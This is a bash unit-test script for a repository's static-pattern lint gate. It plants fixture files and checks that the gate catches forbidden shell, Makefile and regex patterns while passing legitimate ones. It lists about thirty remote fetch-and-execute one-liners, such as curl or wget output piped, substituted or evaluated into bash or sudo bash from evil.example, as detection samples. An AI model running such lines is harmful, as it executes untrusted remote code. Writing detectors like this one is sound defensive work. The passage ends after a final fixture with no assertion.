#!/usr/bin/env bash

# SPDX-FileCopyrightText: 2026 Bruno Marques Venceslau de Souza <b@venceslau.dev>
#
# SPDX-License-Identifier: GPL-3.0-or-later

#
# Unit tests for bin/check-patterns (static-pattern gate). Proves the
# gate CATCHES a real curl|sh / wget|bash fetch, an ad-hoc `uname -m` outside
# lib/os.sh, a hardcoded Homebrew prefix, a `brew shellenv` fork, bash 4 syntax
# in the bash-3.2 surface, a `--` after a tool's first operand, a raw readlink
# in lib/ outside _link_readlink's body, a -g-less local/typeset of zsh's
# path specials, a Markdown prose line over 80 columns, a symlink
# where a recursive scan reads (on disk, always; tracked or an unpinned
# submodule, repo-wide, in a real checkout), and its own fixtures'
# git calls surviving a leaked GIT_DIR, and a report line carrying terminal
# control bytes (printed escaped, never raw); PASSES a clean tree, the sanctioned
# `uname -m` in lib/os.sh, and each of those literals where it is legitimate;
# SKIPS an absent optional dir (the fail-open regression that made the old inline
# recipe silently pass), FAILS CLOSED on a scan error, and refuses a no-op scan.
# Fixture trees only: the real repo is listed (git ls-files), never scanned.
# Not on the shellcheck surface.
set -euo pipefail

repo_root="$(cd "$(dirname "$0")/.." && pwd)"
cp="$repo_root/bin/check-patterns"
[ -x "$cp" ] || { echo "FAIL: bin/check-patterns is not executable" >&2; exit 1; }

pass=0
fail() { echo "FAIL: $*" >&2; exit 1; }
ok()   { pass=$((pass + 1)); }
# An unguarded command that fails kills the suite under `set -e` with no
# FAIL line: on macOS CI that read as "rc 1, output above" with nothing above.
# Name the line instead. errtrace (-E) carries the trap into functions; the
# BASH_SUBSHELL test keeps it out of $( ) and ( ) subshells, where bash 3.2
# fires ERR even when the caller checks the status (`x="$(cmd)" || rc=$?`).
# An unchecked subshell failure still surfaces at its caller's line.
set -E
trap '_err_rc=$?; [ "${BASH_SUBSHELL:-0}" -ne 0 ] || echo "ERR: unexpected failure at line $LINENO (rc $_err_rc): $BASH_COMMAND" >&2' ERR

# The leaked-GIT_DIR regression (arm 12 below) re-runs this file ONCE, at depth
# 1. A broken guard there must abort here at depth 2, a red test, never an
# unbounded chain of forks.
_CPT_DEPTH="${_CPT_DEPTH:-0}"
[ "$_CPT_DEPTH" -le 1 ] \
  || fail "nested at depth $_CPT_DEPTH: the leaked-GIT_DIR regression's recursion guard is broken"

work="$(mktemp -d "${TMPDIR:-/tmp}/check_patterns_test.XXXXXX")"
# chmod back before rm: one case revokes read on a dir to force a scan error.
trap 'chmod -R u+rwx "$work" 2>/dev/null || true; rm -rf "$work"' EXIT INT TERM

# A leaked GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE would make every `git` call
# below (this file's own fixtures, and check-patterns' git calls when it runs
# against them) operate on THAT repository instead of the scratch tree it was
# given. Strip git's own local env vars before anything else runs.
if command -v git >/dev/null 2>&1; then
  # shellcheck disable=SC2046  # word-splitting is the point: one name per word
  unset $(git rev-parse --local-env-vars 2>/dev/null) 2>/dev/null || true
fi
# A ceiling so a fixture with no .git of its own is never mistaken for being
# inside one - relevant only if $TMPDIR itself sits inside a git checkout.
export GIT_CEILING_DIRECTORIES="$work"

# run ROOT -> echo check-patterns' exit code (never aborts under set -e). Clears an
# ambient STRICT so a "no STRICT" case is set by the CASE, not the environment: CI runs
# `make local-ci STRICT=1`, and make EXPORTS that into the test's env, which would
# otherwise leak into the STRICT-reading arm 5 and fail every fixture that
# plants no plugin shim files. run_strict() below is the explicit STRICT=1 form.
run() { local rc=0; STRICT= "$cp" "$1" >/dev/null 2>&1 || rc=$?; echo "$rc"; }
# same, with STRICT=1 exported to the gate ($cp is an external command, so the
# assignment prefix is inherited into its environment)
run_strict() { local rc=0; STRICT=1 "$cp" "$1" >/dev/null 2>&1 || rc=$?; echo "$rc"; }

# --- a clean tree passes (and carries the sanctioned uname -m in lib/os.sh) ---
r="$work/clean"; mkdir -p "$r/lib" "$r/bin"
printf '#!/bin/sh\necho hi\n' > "$r/install.sh"
printf 'is_arm() { case "$(uname -m)" in arm64) return 0 ;; esac ; }\n' > "$r/lib/os.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a clean tree must pass"

# --- a real curl|sh fetch is caught ------------------------------------------
r="$work/curl"; mkdir -p "$r/lib"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf 'curl -fsSL https://evil.example/i.sh | sh\n' > "$r/lib/boot.sh"
[ "$(run "$r")" != "0" ] && ok || fail "a curl|sh fetch must fail the gate"

# --- a real wget|bash fetch is caught ----------------------------------------
r="$work/wget"; mkdir -p "$r/bin"
printf 'wget -qO- https://x.example/i | bash\n' > "$r/bin/tool"
[ "$(run "$r")" != "0" ] && ok || fail "a wget|bash fetch must fail the gate"

# --- a fetch EXECUTED through command or process substitution is caught -------
# No pipe after curl/wget, so the pipe arm alone passed every one of these
# (measured). One fixture file per shape, each in its own tree.
i=0
while IFS= read -r line; do
  i=$((i + 1)); r="$work/subst$i"; mkdir -p "$r/lib"
  printf 'noop() { : ; }\n' > "$r/lib/os.sh"
  printf '%s\n' "$line" > "$r/lib/boot.sh"
  [ "$(run "$r")" != "0" ] && ok || fail "an executed fetch must fail the gate: $line"
done <<'SHAPES'
sh -c "$(curl -fsSL https://evil.example/i.sh)"
bash -c "$(wget -qO- https://evil.example/i.sh)"
eval "$(curl -fsSL https://evil.example/i.sh)"
eval `curl -fsSL https://evil.example/i.sh`
source <(curl -fsSL https://evil.example/i.sh)
. <(curl -fsSL https://evil.example/i.sh)
bash <(wget -qO- https://evil.example/i.sh)
bash -lc "$(curl -fsSL https://evil.example/i.sh)"
zsh -ec "$(wget -qO- https://evil.example/i.sh)"
sh -c "$(command curl -fsSL https://evil.example/i.sh)"
bash -c "$(\curl -fsSL https://evil.example/i.sh)"
bash < <(curl -fsSL https://evil.example/i.sh)
\curl -fsSL https://evil.example/i.sh | sh
curl -fsSL https://evil.example/i.sh | sudo bash
curl -fsSL https://evil.example/i.sh | /bin/bash
wget -qO- https://evil.example/i.sh | env bash
bash -l -c "$(curl -fsSL https://evil.example/i.sh)"
bash --norc -c "$(curl -fsSL https://evil.example/i.sh)"
bash -c -- "$(curl -fsSL https://evil.example/i.sh)"
sh -c "  $(curl -fsSL https://evil.example/i.sh)"
eval "$(env curl -fsSL https://evil.example/i.sh)"
bash -c "$(/usr/bin/curl -fsSL https://evil.example/i.sh)"
curl -fsSL https://evil.example/i.sh | sudo -E bash
curl -fsSL https://evil.example/i.sh | sudo -u root bash
curl -fsSL https://evil.example/i.sh |& bash
curl -fsSL https://evil.example/i.sh | exec bash
curl -fsSL https://evil.example/i.sh | "bash"
curl -fsSL https://evil.example/i.sh | ksh
wget -qO- https://evil.example/i.sh | dash
bash <(sudo curl -fsSL https://evil.example/i.sh)
eval -- "$(curl -fsSL https://evil.example/i.sh)"
SHAPES

# --- capturing a download is NOT executing it (passes) -------------------------
r="$work/capture"; mkdir -p "$r/lib"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf '%s\n' 'body="$(curl -fsSL https://api.example/v1)"' 'medieval="$(wget -qO- https://x.example)"' \
  'bash -x "$(command -v curl)"' 'sh -e ./build.sh < "$(curl_cfg)"' \
  'curl -fsSL https://x.example/f | shasum -a 256' 'wget -qO- https://x.example | bashful' \
  'curl -fsSL https://x.example/f | tee out.log' 'curl -fsSL https://x.example/f | grep bash' > "$r/lib/fetch.sh"
[ "$(run "$r")" = "0" ] && ok || fail "capturing curl/wget output into a variable must pass"

# --- ad-hoc `uname -m` OUTSIDE lib/os.sh is caught ---------------------------
r="$work/uname"; mkdir -p "$r/lib" "$r/zsh"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf 'case "$(uname -m)" in arm64) A=1 ;; esac\n' > "$r/zsh/arch.zsh"
[ "$(run "$r")" != "0" ] && ok || fail "ad-hoc uname -m outside lib/os.sh must fail"

# --- the SAME `uname -m`, but INSIDE lib/os.sh, is sanctioned (passes) --------
r="$work/uname-ok"; mkdir -p "$r/lib"
printf 'case "$(uname -m)" in arm64) return 0 ;; esac\n' > "$r/lib/os.sh"
[ "$(run "$r")" = "0" ] && ok || fail "sanctioned uname -m in lib/os.sh must pass"

# --- REGRESSION: an absent optional dir (home/) must NOT mask a violation -----
# The old recipe passed `home` to grep unconditionally; a missing home made grep
# exit 2, which bash's `if grep` read as "no match", disabling BOTH checks. Here
# home/ is absent AND a real curl|sh is planted - the gate must still fail.
r="$work/regress"; mkdir -p "$r/lib"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf 'curl https://x | sh\n' > "$r/lib/boot.sh"
[ ! -e "$r/home" ] || fail "fixture bug: home/ should be absent for this case"
[ "$(run "$r")" != "0" ] && ok || fail "an absent home/ must not mask a real violation (fail-open regression)"

# --- FAIL CLOSED: an unreadable scanned dir errors the scan -> non-zero -------
# `chmod 000` is bypassed by root (DAC_OVERRIDE), so this SKIPs under root.
# Measured rejections of a portable, root-proof replacement:
#   - a socket: grep -r skips it by TYPE, never opens it (exit 1, no error).
#   - a FIFO: same skip, and opening one risks a hang if that ever changed.
#   - a near-PATH_MAX path: grep's openat() traversal scanned a 4274-byte one
#     clean (ENAMETOOLONG is a kernel limit, not a permission check - but this
#     is Linux-only evidence; BSD grep on the real macOS target is untested).
# No portable mechanism forces exit >= 2 for root, so the skip stays (allowed
# by docs/development.md's "STRICT=1" privilege-skip rule).
if [ "$(id -u)" -ne 0 ]; then
  r="$work/failclosed"; mkdir -p "$r/lib/locked"
  printf 'noop() { : ; }\n' > "$r/lib/os.sh"
  chmod 000 "$r/lib/locked"
  [ "$(run "$r")" != "0" ] && ok || fail "an unreadable path must fail closed, not silently pass"
  chmod u+rwx "$r/lib/locked"
else
  # exempt: privilege (root) skip, not tool-availability
  echo "  SKIP: running as root - cannot exercise the unreadable-path fail-closed case"
fi

# --- a tree with no scan paths at all must refuse (no-op scan != pass) --------
r="$work/empty"; mkdir -p "$r"
[ "$(run "$r")" != "0" ] && ok || fail "a tree with no scan paths must not pass"

# --- rule 4: an UNESCAPED `#` inside a Makefile `$(shell ...)` is caught -------
# macOS system make (3.81) reads a bare `#` in a function argument as a comment and
# aborts ("unterminated call to function shell"); it MUST be escaped `\#`. Targeted at
# the Makefile (absent from the scan surface), so include a lib/os.sh so the scan is not
# a no-op refuse - this isolates the Makefile rule.
r="$work/mkhash"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
PY := $(shell grep -cE '^#!' x)
EOF
[ "$(run "$r")" != "0" ] && ok || fail "an unescaped # inside a Makefile \$(shell ...) must fail the gate"

# the SAME line with the `#` ESCAPED (`\#`) passes - the fix, and proof it is not a
# blanket ban on `#` in the Makefile.
r="$work/mkhashok"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
PY := $(shell grep -cE '^\#!' x)
EOF
[ "$(run "$r")" = "0" ] && ok || fail "an escaped \\# inside a Makefile \$(shell ...) must pass"

# a legit trailing `# comment` AFTER the `$(shell ...)` closes is not flagged (only a `#`
# INSIDE the call), and a Makefile with no `$(shell ...)` at all passes.
r="$work/mkcomment"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
FILES := $(shell ls)   # a normal make comment after the call
OTHER := plain value   # another comment
EOF
[ "$(run "$r")" = "0" ] && ok || fail "a trailing # comment after \$(shell ...) must not be flagged"

# the `${shell ...}` CURLY form is caught too - make accepts both `$(...)` and `${...}`.
r="$work/mkcurly"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
X := ${shell echo a#b}
EOF
[ "$(run "$r")" != "0" ] && ok || fail "an unescaped # inside a Makefile \${shell ...} must fail the gate"

# a comment GLUED to the closing `)` (no whitespace: `)#c`) is NOT flagged - the `#` is outside
# the call (a normal make comment). The char class excludes `)`/`}` so the gate does not
# over-flag this legit style (the reviewer's fail-closed false-positive fix).
r="$work/mkglued"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
FILES := $(shell ls)#c
EOF
[ "$(run "$r")" = "0" ] && ok || fail "a comment glued to the \$(shell ...) close ')#c' must not be flagged"

# === the pinned zsh-plugin shim-premise shape =============
# The gate asserts the startup fork the shim neutralizes is STILL in the pinned
# source, so a submodule bump re-verifies the shim. The fixture plants the plugin file
# under $r/zsh/plugins/ (explicit-path arm; the shared arms leave the pinned
# zsh/plugins out of their roots, which does not reach a directly-named file).
fsh_rel="zsh/plugins/fast-syntax-highlighting/fast-syntax-highlighting.plugin.zsh"
plant_shims() {  # $1=root  $2=fsh-line
  mkdir -p "$1/lib" "$1/$(dirname "$fsh_rel")"
  printf 'noop() { : ; }\n' > "$1/lib/os.sh"
  printf '%s\n' "$2" > "$1/$fsh_rel"
}

# correct shape present -> pass (no false positive)
r="$work/shim-ok"
plant_shims "$r" 'if [[ $(uname -a) = (#i)*darwin* ]] {'
[ "$(run "$r")" = "0" ] && ok || fail "a correct shim-premise shape must pass"

# f-sy-h probe drifted ($(uname -s), not -a) -> the uname shim would stop covering it
r="$work/shim-uname-drift"
plant_shims "$r" 'if [[ $(uname -s) = (#i)*darwin* ]] {'
[ "$(run "$r")" != "0" ] && ok || fail 'a drifted f-sy-h uname probe (no $(uname -a)) must fail the gate'

# an ABSENT plugin submodule (uninitialized) is a loud SKIP normally, hard FAIL under STRICT
r="$work/shim-absent"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
[ "$(run "$r")" = "0" ] && ok || fail "an absent plugin submodule must pass (loud skip) without STRICT"
[ "$(run_strict "$r")" = "2" ] && ok || fail "an absent plugin submodule must FAIL CLOSED (exit 2) under STRICT=1: the check could not run"

# --- shared fixture + a message-asserting runner --------------------------------
seed() {  # $1=root - the minimum tree the shared arms pass, so a case isolates ONE rule
  mkdir -p "$1/lib"
  printf 'noop() { : ; }\n' > "$1/lib/os.sh"
}
# fails_with ROOT MESSAGE LABEL - the gate must fail AND name the arm under test.
# A bare "exit != 0" can be satisfied by a DIFFERENT arm firing on something else in
# the fixture, which would let the case pass while the bug it guards is present.
fails_with() {
  local rc=0 out
  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
  [ "$rc" != "0" ] || fail "$3: the gate passed"
  case "$out" in
    *"$2"*) pass=$((pass + 1)) ;;
    *) fail "$3: expected the message '$2', got: $out" ;;
  esac
}

# fails_only_with ROOT MESSAGE LABEL - fails_with, plus every `check-patterns:`
# line but an informational SKIP must be MESSAGE: the non-zero exit cannot come
# from another arm.
fails_only_with() {
  local rc=0 out line
  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
  [ "$rc" != "0" ] || fail "$3: the gate passed"
  case "$out" in
    *"$2"*) ;;
    *) fail "$3: expected the message '$2', got: $out" ;;
  esac
  while IFS= read -r line; do
    case "$line" in
      "$2"* | "check-patterns: SKIP "*) ;;
      check-patterns:*) fail "$3: another message fired too: $line" ;;
    esac
  done <<<"$out"
  pass=$((pass + 1))
}

# fails_with_rc RC ROOT MESSAGE LABEL [only] - the gate must exit EXACTLY RC
# with MESSAGE; with `only`, no other check-patterns line but a SKIP. Every
# scan-error fixture asserts rc 2: a bare "rc != 0" lets a fail-closed site
# regress to the 1 of a violation (or drop the fatal mark) unseen.
fails_with_rc() {
  local want="$1" rc=0 out line
  shift
  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
  [ "$rc" = "$want" ] || fail "$3: expected exit $want, got $rc: $out"
  case "$out" in
    *"$2"*) ;;
    *) fail "$3: expected the message '$2', got: $out" ;;
  esac
  if [ "${4:-}" = only ]; then
    while IFS= read -r line; do
      case "$line" in
        "$2"* | "check-patterns: SKIP "*) ;;
        check-patterns:*) fail "$3: another message fired too: $line" ;;
      esac
    done <<<"$out"
  fi
  pass=$((pass + 1))
}

curl_msg="check-patterns: forbidden curl|sh runtime fetch"
uname_msg="check-patterns: ad-hoc 'uname -m'"
brew_msg="check-patterns: hardcoded Homebrew prefix"
fork_msg="check-patterns: a 'brew shellenv' / 'brew --prefix' fork"
b32_msg="check-patterns: bash 4 syntax in the bash-3.2 surface"
rl_msg="check-patterns: a raw readlink in install.sh or lib/ outside lib/link.sh's _link_readlink"
tied_msg="check-patterns: a local/typeset without -g, or a for/foreach/select loop variable, of zsh's path"

# === the Homebrew prefix arm ====================================================
# The prefix is /opt/homebrew on Apple Silicon and /usr/local on Intel and MUST be
# resolved by directory existence: a hardcoded arm64 prefix passes every gate on the
# Apple Silicon mac and breaks the Intel one silently. The gate reads the two prefixes
# as SEPARATE WORDS on one line as the detection shape, so a LONE /opt/homebrew is the
# violation.
r="$work/brew-lone"; seed "$r"; mkdir -p "$r/zsh"
printf 'path=(/opt/homebrew/bin $path)\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a lone /opt/homebrew"

# a trailing comment naming the Intel prefix does NOT buy an exemption - the comment
# tail is removed before the pair is looked for. This is the most natural thing an
# author writes next to the hardcode, so it is the case that matters most.
r="$work/brew-comment-dodge"; seed "$r"; mkdir -p "$r/zsh"
printf 'export HOMEBREW_PREFIX=/opt/homebrew  # or /usr/local on Intel\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a trailing comment must not exempt a hardcode"

# ...and neither does the `;#` form. The shell starts a comment after any unquoted
# metacharacter, not only after whitespace, so the splitter must know that too.
r="$work/brew-semi-dodge"; seed "$r"; mkdir -p "$r/zsh"
printf 'export HOMEBREW_PREFIX=/opt/homebrew;# or /usr/local on Intel\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a ';#' comment must not exempt a hardcode"

# naming BOTH prefixes inside ONE word is an unconditional hardcode, not detection.
r="$work/brew-both-one-word"; seed "$r"; mkdir -p "$r/zsh"
printf 'export PATH="/opt/homebrew/bin:/usr/local/bin:$PATH"\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "both prefixes in one word must still fail"

# the exemption is ADJACENCY, not co-occurrence: an unrelated /usr/local elsewhere on
# the line (this repo really does use /usr/local/go/bin) must not exempt a hardcode.
r="$work/brew-coincidental"; seed "$r"; mkdir -p "$r/zsh"
printf '[ -d /usr/local/go ] && export HOMEBREW_PREFIX=/opt/homebrew\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a coincidental /usr/local must not exempt a hardcode"

# FAIL CLOSED on the ROOT's own path: the exemption is tested against the CODE alone,
# never the whole grep line, so a scan root that itself contains /usr/local cannot
# silently disable the arm for the entire tree.
r="$work/usr/local/rooted"; seed "$r"; mkdir -p "$r/zsh"
printf 'path=(/opt/homebrew/bin $path)\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a root path containing /usr/local must not disable the arm"

# the sanctioned shape: both prefixes as separate words (zsh/zshrc's real loop)
r="$work/brew-pair"; seed "$r"; mkdir -p "$r/zsh"
printf 'for prefix in /opt/homebrew /usr/local; do : ; done\n' > "$r/zsh/prefix.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "the /opt/homebrew + /usr/local pair must pass"

# and the same shape inside a continued candidate list (zsh/fzf.zsh's real line)
r="$work/brew-pair-list"; seed "$r"; mkdir -p "$r/zsh"
printf '      /opt/homebrew/opt/fzf/shell /usr/local/opt/fzf/shell \\\n' > "$r/zsh/prefix.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a continued candidate pair must pass"

# prose that names one prefix is not a hardcode - CLAUDE.md REQUIRES the comment that
# explains the constraint, so flagging it would forbid documenting the rule.
r="$work/brew-comment"; seed "$r"; mkdir -p "$r/zsh"
printf '  # /opt/homebrew is the Apple Silicon prefix\n' > "$r/zsh/prefix.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a commented /opt/homebrew must pass"

# ...including as a TRAILING comment on a line of real code
r="$work/brew-trailing-ok"; seed "$r"; mkdir -p "$r/zsh"
printf 'p=$prefix/bin/brew  # never a hardcoded /opt/homebrew\n' > "$r/zsh/prefix.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a trailing comment naming the prefix must pass"

# ALLOWLIST: gpg-agent.conf has no variable expansion, so its absolute pinentry path
# cannot be prefix-detected.
r="$work/brew-gpg"; seed "$r"; mkdir -p "$r/config/gnupg"
printf 'pinentry-program /opt/homebrew/bin/pinentry-mac\n' > "$r/config/gnupg/gpg-agent.conf"
[ "$(run "$r")" = "0" ] && ok || fail "gpg-agent.conf's absolute pinentry path must pass (allowlisted)"

# --- REGRESSION: the gpg-agent.conf exemption is ANCHORED to the EXACT scanned
# path, never a bare suffix ---------------------------------------------------
# An earlier version (`^([^:]*/)?config/gnupg/gpg-agent\.conf:`) exempted ANY
# path ending in those segments, so a DECOY file at a different real path that
# happens to end the same way (e.g. config/vendor/config/gnupg/gpg-agent.conf,
# still inside the scanned config/ tree) was wrongly exempted too - fail-OPEN
# (reproduced against the pre-fix pattern: exit 0, expected non-zero). The real
# config/gnupg/gpg-agent.conf above must still pass; this fixture proves a
# LOOK-ALIKE path elsewhere does not ride along on that exemption.
r="$work/brew-gpg-decoy"; seed "$r"; mkdir -p "$r/config/vendor/config/gnupg" "$r/config/gnupg"
printf 'pinentry-program /opt/homebrew/bin/pinentry-mac\n' > "$r/config/vendor/config/gnupg/gpg-agent.conf"
printf 'pinentry-program /opt/homebrew/bin/pinentry-mac\n' > "$r/config/gnupg/gpg-agent.conf"
[ "$(run "$r")" != "0" ] && ok || fail "a decoy config/vendor/config/gnupg/gpg-agent.conf (not the real allowlisted path) must still fail"

# ASYMMETRIC by design: /usr/local alone is a generic FHS path with non-Homebrew uses
# (zsh/zshenv's /usr/local/go/bin), so it is never flagged on its own.
r="$work/usrlocal-alone"; seed "$r"; mkdir -p "$r/zsh"
printf 'path=(/usr/local/go/bin $path)\n' > "$r/zsh/go.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a lone /usr/local must NOT be flagged"

# === the brew-fork arm ==========================================================
r="$work/shellenv"; seed "$r"; mkdir -p "$r/zsh"
printf 'eval "$(brew shellenv)"\n' > "$r/zsh/brew.zsh"
fails_with "$r" "$fork_msg" "a 'brew shellenv' fork"

# `brew --prefix` is the same fork asking the same question
r="$work/brewprefix"; seed "$r"; mkdir -p "$r/zsh"
printf 'export P="$(brew --prefix)"\n' > "$r/zsh/brew.zsh"
fails_with "$r" "$fork_msg" "a 'brew --prefix' fork"

# every OTHER brew call is untouched - `brew bundle` is how packages get installed
# `brew --prefix FORMULA` asks where a formula lives, which is a different question;
# flagging it would offer a remedy ("resolve by directory existence") that does not apply.
r="$work/brewformula"; seed "$r"
printf 'export OPENSSL_DIR="$(brew --prefix openssl@3)"\n' > "$r/lib/ssl.sh"
[ "$(run "$r")" = "0" ] && ok || fail "'brew --prefix <formula>' must pass"

r="$work/brewbundle"; seed "$r"
printf 'brew bundle --file "$DOTFILES/packages/Brewfile"\n' > "$r/lib/packages.sh"
[ "$(run "$r")" = "0" ] && ok || fail "'brew bundle' must pass (only prefix probes are forbidden)"

r="$work/shellenv-comment"; seed "$r"; mkdir -p "$r/zsh"
printf 'p=$prefix/bin/brew  # never via a brew shellenv fork\n' > "$r/zsh/brew.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a commented 'brew shellenv' must pass"

# === the bash-3.2 surface arm ===================================================
# macOS ships /bin/bash 3.2 and the installer runs under it. `make lint`'s
# `/bin/bash -n` cannot see any of these three: `declare -A` and `mapfile` are
# ordinary command invocations, and ${var,,} fails at expansion, not at parse. This
# arm is their only gate.
r="$work/b32-assoc"; seed "$r"
printf 'declare -A seen\n' > "$r/lib/tool.sh"
fails_with "$r" "$b32_msg" "an associative array in lib/"

r="$work/b32-mapfile"; seed "$r"
printf '#!/bin/sh\nmapfile -t lines < f\n' > "$r/install.sh"
fails_with "$r" "$b32_msg" "mapfile in install.sh"

r="$work/b32-case"; seed "$r"
printf 'x="${name,,}"\n' > "$r/lib/tool.sh"
fails_with "$r" "$b32_msg" '${var,,} in lib/'

# a POSITIONAL parameter is the most idiomatic use of the construct, so the
# parameter class must not be limited to names.
r="$work/b32-positional"; seed "$r"
printf 'lower="${1,,}"\n' > "$r/lib/tool.sh"
fails_with "$r" "$b32_msg" '${1,,} on a positional parameter'

# indirect expansion is bash 4 as well, and this arm is its only gate
r="$work/b32-indirect"; seed "$r"
printf 'x="${!v,,}"\n' > "$r/lib/tool.sh"
fails_with "$r" "$b32_msg" '${!v,,} through an indirection'

# bin/ is EXEMPT: those tools run only on a provisioned host or a CI runner.
r="$work/b32-bin-exempt"; seed "$r"; mkdir -p "$r/bin"
printf 'declare -A seen\nmapfile -t lines < f\nx="${name,,}"\n' > "$r/bin/tool"
[ "$(run "$r")" = "0" ] && ok || fail "bash 4 syntax under bin/ must pass (bin is exempt)"

# the headers that STATE the constraint spell the literals; they are not violations.
r="$work/b32-comment"; seed "$r"
printf '# Bash 3.2 compatible (no associative arrays, no mapfile, no ${var,,}).\n' > "$r/lib/tool.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a comment spelling the bash-4 literals must pass"

# ...and neither is the same warning written as a TRAILING comment.
r="$work/b32-trailing-ok"; seed "$r"
printf 'x=$(printf %%s "$n" | tr A-Z a-z)  # bash 3.2: no ${name,,} here\n' > "$r/lib/tool.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a trailing comment naming the bash-4 literals must pass"

# ...nor the `;#` form of the same warning.
r="$work/b32-semi-ok"; seed "$r"
printf 'x=1;# bash 3.2: no ${name,,} here, use tr\n' > "$r/lib/tool.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a ';#' comment naming the bash-4 literals must pass"

# === the GNU-only regex escape arm ===============================================
# BSD sed and grep (macOS) implement POSIX regex. GNU's `\s \S \w \W \b \B \< \>`
# shorthands and its BRE `\| \+ \?` operators are extensions: on a mac the pattern
# silently means something else (a literal `s`, a literal `|`) and the command
# neither matches nor errors. Linux runs GNU tools, so no Linux run of the suite
# sees the break. This arm is the static half that does. Fixtures spell every
# escape through a double-quoted `\\`, so THIS file's own source never carries
# the single-backslash shape the arm looks for.
gnu_msg="check-patterns: a GNU-only regex escape"

# the exact line that failed on macOS: BSD `sed -E` has no `\s`, the substitution
# never matched, and the test read the whole loop line as its tool list.
r="$work/gnu-sed-s"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "tools=\"\$(sed -E 's/^\\s*for tool in (.*); do\\s*\$/\\1/' <<<\"\$loop_line\")\"" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "sed -E with \\s in tests/"

# a word boundary in a gate's own pattern, on a CONTINUATION line that names no
# grep at all (bin/secret-scan's shape): the arm must not depend on the call word.
r="$work/gnu-grep-b"; seed "$r"; mkdir -p "$r/bin"
printf '%s\n' "_sc_grep \"\$f\" \"\$name\" 'aws' \\" "    '\\b(AKIA|ASIA)[0-9A-Z]{16}\\b' '' && hits=1" > "$r/bin/scan"
fails_with "$r" "$gnu_msg" "a \\b word boundary on a continuation line"

# a workflow step runs on the macOS runner, so it is on the surface too
r="$work/gnu-ci"; seed "$r"; mkdir -p "$r/.github/workflows"
printf '%s\n' "      - run: grep -qE '\\w+' file" > "$r/.github/workflows/ci.yml"
fails_with "$r" "$gnu_msg" "a \\w in a workflow run step"

# BRE alternation is a GNU extension: BSD grep reads `\|` as a literal bar
r="$work/gnu-bre-alt"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "! grep -q '/Users/\\|/home/' \"\$f\"" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "a BRE \\| alternation"

# ...and so are the BRE `\?` and `\+` quantifiers, in either quote style
r="$work/gnu-bre-opt"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "grep -qi \"ecosystem:[[:space:]]*x\\?y\" <<<\"\$c\"" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "a BRE \\? quantifier"

# the other quote character inside the pattern must not end the argument early
r="$work/gnu-bre-mixed-quote"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "if grep -qi 'package-ecosystem:[[:space:]]*\"\\?gitsubmodule' <<<\"\$db\"; then" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "a BRE \\? after a \" inside a single-quoted pattern"

# the fix: POSIX classes and ERE operators mean the same thing on both platforms
r="$work/gnu-posix-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "sed -E 's/^[[:space:]]*for tool in (.*); do[[:space:]]*\$/\\1/'" \
  "grep -qE '(^|[^[:alnum:]_])AKIA[0-9A-Z]{16}([^[:alnum:]_]|\$)' f" \
  "grep -qE '/Users/|/home/' f" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "POSIX classes and ERE alternation must pass"

# inside an ERE, `\|` is an ESCAPED literal bar, portable on both platforms
r="$work/gnu-ere-literal-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "grep -Eq '\\|\\|[[:space:]]*(true|:)' f" "grep -cE '\\|\\| less' f" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "an escaped literal \\| inside grep -E must pass"

# a doubled backslash is a literal backslash, not a GNU escape
r="$work/gnu-literal-bs-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "grep -qF 'C:\\\\sys' f" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a literal backslash before s must pass"

# the comment that explains the rule necessarily spells the escape
r="$work/gnu-comment-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "# POSIX classes, not \\s: BSD sed has no \\s" > "$r/tests/x_test.sh"
